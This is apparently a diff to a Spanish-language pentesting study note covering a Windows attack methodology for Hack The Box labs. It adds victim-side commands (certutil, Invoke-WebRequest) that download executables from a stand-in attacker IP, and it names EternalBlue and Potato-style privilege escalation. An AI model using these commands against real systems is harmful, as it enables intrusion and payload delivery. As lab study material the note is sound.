@@ -124,6 +124,23 @@ nmap -p 445 --script smb-vuln-ms17-010 <target>
 use exploit/windows/smb/ms17_010_eternalblue
 ```
 
+### Transferencia de archivos (BLOQUE 6)
+
+```bash
+# Desde la víctima (CMD) — certutil (puede ser detectado por Defender)
+certutil -urlcache -split -f http://<tu_ip>/archivo.exe archivo.exe
+
+# Desde la víctima (PowerShell)
+Invoke-WebRequest -Uri http://<tu_ip>/archivo.exe -OutFile archivo.exe
+IWR http://<tu_ip>/archivo.exe -OutFile archivo.exe
+
+# Servidor HTTP en Kali para servir archivos
+python3 -m http.server 80
+```
+
+> [!important] TOKENS Y POTATO
+> Token impersonation, JuicyPotato, PrintSpoofer y SeImpersonatePrivilege con detalle en [[Escalada de Privilegios]]. Aquí solo se listan como vectores de la fase 4.
+
 ---
 
 ## Fase 4: Escalada de Privilegios
@@ -152,7 +169,7 @@ driverquery
 # Puertos abiertos
 netstat -ano
 
-#防火墙
+# Firewall
 netsh advfirewall show allprofiles
 ```
 
@@ -266,27 +283,23 @@ Enter-PSSession -ComputerName <target> -Credential <cred>
 
 
 
+
+
 ---
 
 ## 🔗 Red de Conocimiento
 
 ### Documentos Relacionados
 
-- [[../../apuntes Andres/12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype.md|12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype]] — Escalada de Privilegios, SMB / Impacket, SQLMap
-- [[../06 - Explotacion y Post-Explotacion/Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Escalada de Privilegios, Metasploit, SMB / Impacket
-- [[../../comandos/SQLMap.md|SQLMap]] — Hack The Box, Metasploit, SQLMap
-- [[../../apuntes Chema/Maquinas/Vaccine.md|Vaccine]] — Escalada de Privilegios, Metasploit, SQLMap
-- [[../../apuntes Andres/11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad.md|11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad]] — Escalada de Privilegios, Metasploit, SQLMap
-- [[../../apuntes Andres/15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows.md|15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows]] — Escalada de Privilegios, Metasploit, SMB / Impacket
+- [[../../apuntes Andres/12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype.md|12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype]] — Desarrollo Web, Hack The Box, SQL Injection
+- [[../../apuntes evolve/BLOQUE 5.md|BLOQUE 5]] — Desarrollo Web, Hack The Box, Linux
+- [[../06 - Explotacion y Post-Explotacion/Prácticas CTF - HTB y VulnHub.md|Prácticas CTF - HTB y VulnHub]] — Desarrollo Web, Hack The Box, SQL Injection
+- [[../06 - Explotacion y Post-Explotacion/Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Hack The Box, Linux, Windows
+- [[../../apuntes Andres/15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows.md|15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows]] — Desarrollo Web, Hack The Box, SQL Injection
 
-### 🛠️ Herramientas
+### 🌐 Cross-Dominio
 
-- [[comandos/Metasploit|Metasploit]]
-- [[comandos/SMB_Impacket|SMB / Impacket]]
-- [[comandos/SQLMap|SQLMap]]
+- [[../../../programacion/Android/fundamentos_android.md|fundamentos_android]] — Programacion: Desarrollo Web, Kubernetes, Linux
+- [[../../../ia/mlflow.md|mlflow]] — IA: Desarrollo Web, Redes, SQL
 
-### 🎯 Vulnerabilidades Relacionadas
-
-- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
-
-> #escalada-privilegios #hack-the-box #linux #metasploit #post-explotacion #redes #smb-impacket #sqli #sqlmap #windows
+> #escalada_privilegios #hack_the_box #kubernetes #linux #linux_ciber #metasploit #post_explotacion #redes #smb_impacket #sql #sqli #sqlmap_tool #vulnhub #web #windows_ciber
